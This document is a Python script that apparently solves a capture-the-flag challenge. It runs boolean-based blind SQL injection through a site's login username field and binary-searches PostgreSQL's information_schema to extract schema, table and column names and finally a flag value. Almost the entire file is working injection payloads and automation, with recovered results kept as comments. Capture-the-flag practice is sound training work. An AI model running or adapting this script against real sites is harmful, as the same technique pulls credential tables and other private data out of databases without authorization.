import requests
import time


def info_setup():
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Origin': 'https://pasteweb.ctf.zoolab.org',
        'Referer': 'https://pasteweb.ctf.zoolab.org/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
    }
    
    data = {
        "username": "admin",
        "password": "admin",
        "current_time": str(int(time.time())),
    }
    
    return headers, data


def BinSearch(target: str, start: int, end: int, step: int, headers: dict, url: str, session: requests.Session()):
    while start < end:
        mid = (start + end) // 2
        data = {
            "username": f"{target} {mid} -- #",
            "password": "password",
            "current_time": str(int(time.time())),
        }
        response = session.post(url, headers=headers, data=data)
        if response.text.find("Login Failed") != -1:
            end = mid
        else:
            start = mid + step
    return start


if __name__ == '__main__':
    url = "https://pasteweb.ctf.zoolab.org/"
    headers, test_data = info_setup()
    
    # Link Check
    with requests.Session() as session:
        response = session.get(url)
        if response.status_code != 200:
            print("Link Error")
            exit()
    
    # Start Injection
    with requests.Session() as session:
        # # ------ Check Database informations ------
        # # Check how many database in the server
        # start = 0
        # end = 200
        # step = 1
        # nums_of_database = nums_of_database = BinSearch("' or (select count(*) from information_schema.schemata) >", start, end, step, headers, url, session)
        # print(nums_of_database)
        
        # # Check each length of database
        # lengths_of_database = [
        #     BinSearch(
        #         f"' or length((select schema_name from information_schema.schemata limit 1 offset {i})) >",
        #         start,
        #         end,
        #         step,
        #         headers,
        #         url,
        #         session,
        #     )
        #     for i in range(nums_of_database)
        # ]
        # print(lengths_of_database)
        
        # # Check each name of database
        # names_of_database = = [
        #     "".join(
        #         chr(
        #             BinSearch(
        #                 f"' or ascii(substr((select schema_name from information_schema.schemata limit 1 offset {i}),{j+1},1)) >",
        #                 start,
        #                 end,
        #                 step,
        #                 headers,
        #                 url,
        #                 session,
        #             )
        #         )
        #         for j in range(lengths_of_database[i])
        #     )
        #     for i in range(nums_of_database)
        # ]
        # print(names_of_database)
        nums_of_database = 3
        lengths_of_database = [6, 18, 10]
        names_of_database = ['public', 'information_schema', 'pg_catalog']
        
        # # ------ Check Table informations, focus on the database: public ------
        # # Check how many table in the server
        # start = 0
        # end = 200
        # step = 1
        # nums_of_table = BinSearch("' or (select count(*) from information_schema.tables where table_schema = 'public') >", start, end, step, headers, url, session)
        # print(nums_of_table)
        
        # # Check each length of table
        # lengths_of_table = [
        #     BinSearch(
        #         f"' or length((select table_name from information_schema.tables where table_schema = 'public' limit 1 offset {i})) >",
        #         start,
        #         end,
        #         step,
        #         headers,
        #         url,
        #         session,
        #     )
        #     for i in range(nums_of_table)
        # ]
        # print(lengths_of_table)
        
        # # Check each name of table
        # names_of_table = [
        #     "".join(
        #         chr(
        #             BinSearch(
        #                 f"' or ascii(substr((select table_name from information_schema.tables where table_schema = 'public' limit 1 offset {i}),{j+1},1)) >",
        #                 start,
        #                 end,
        #                 step,
        #                 headers,
        #                 url,
        #                 session,
        #             )
        #         )
        #         for j in range(lengths_of_table[i])
        #     )
        #     for i in range(nums_of_table)
        # ]
        # print(names_of_table)
        nums_of_table = 2
        lengths_of_table = [17, 12]
        table_name = ['pasteweb_accounts', 's3cr3t_t4b1e']
        
        # # ------ Check Column informations, focus on the table: s3cr3t_t4b1e ------
        # # Check how many column in the server
        # start = 0
        # end = 200
        # step = 1
        # nums_of_column = BinSearch("' or (select count(*) from information_schema.columns where table_name = 's3cr3t_t4b1e') >", start, end, step, headers, url, session)
        # print(nums_of_column)
        
        # # Check each length of column
        # lengths_of_column = [
        #     BinSearch(
        #         f"' or length((select column_name from information_schema.columns where table_name = 's3cr3t_t4b1e' limit 1 offset {i})) >",
        #         start,
        #         end,
        #         step,
        #         headers,
        #         url,
        #         session,
        #     )
        #     for i in range(nums_of_column)
        # ]
        # print(lengths_of_column)
        
        # # Check each name of column
        # names_of_column = [
        #     "".join(
        #         chr(
        #             BinSearch(
        #                 f"' or ascii(substr((select column_name from information_schema.columns where table_name = 's3cr3t_t4b1e' limit 1 offset {i}),{j+1},1)) >",
        #                 start,
        #                 end,
        #                 step,
        #                 headers,
        #                 url,
        #                 session,
        #             )
        #         )
        #         for j in range(lengths_of_column[i])
        #     )
        #     for i in range(nums_of_column)
        # ]
        # print(names_of_column)
        nums_of_column = 1
        lengths_of_column = [4]
        names_of_column = ['fl4g']
        
        # ------ Check Datas, focus on the column: fl4g ------
        # Check how many datas in the server
        start = 0
        end = 200
        step = 1
        nums_of_datas = BinSearch("' or (select count(*) from s3cr3t_t4b1e) >", start, end, step, headers, url, session)
        print(nums_of_datas)
        
        # Check each length of datas
        lengths_of_datas = [
            BinSearch(
                f"' or length((select fl4g from s3cr3t_t4b1e limit 1 offset {i})) >",
                start,
                end,
                step,
                headers,
                url,
                session,
            )
            for i in range(nums_of_datas)
        ]
        print(lengths_of_datas)
        
        # Check each datas
        datas = [
            "".join(
                chr(
                    BinSearch(
                        f"' or ascii(substr((select fl4g from s3cr3t_t4b1e limit 1 offset {i}),{j+1},1)) >",
                        start,
                        end,
                        step,
                        headers,
                        url,
                        session,
                    )
                )
                for j in range(lengths_of_datas[i])
            )
            for i in range(nums_of_datas)
        ]
        print(datas)
        # nums_of_datas = 1
        # lengths_of_datas = [29]
        # datas = ['FLAG{B1inD_SqL_IiIiiNj3cT10n}']
